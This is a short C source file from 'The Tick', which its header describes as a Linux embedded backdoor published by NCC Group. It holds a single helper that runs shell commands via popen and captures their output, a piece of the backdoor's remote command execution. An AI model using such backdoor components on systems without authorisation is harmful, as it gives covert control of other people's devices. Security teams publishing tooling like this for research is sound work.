/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "shell.h"

int run_simple_command(const char *command, char *buffer, const size_t count)
{
    int success = 0;
    size_t read = 0;
    FILE* file = popen(command, "r");
    if (file != NULL) {
        while (count > read + 1) {
            if (fgets(buffer + read, count - read, file) == NULL) break;
            read = strlen(buffer);
        }
        buffer[read] = 0;
        if (pclose(file) != -1) {
            success = 1;
        }
    }
    return success;
}
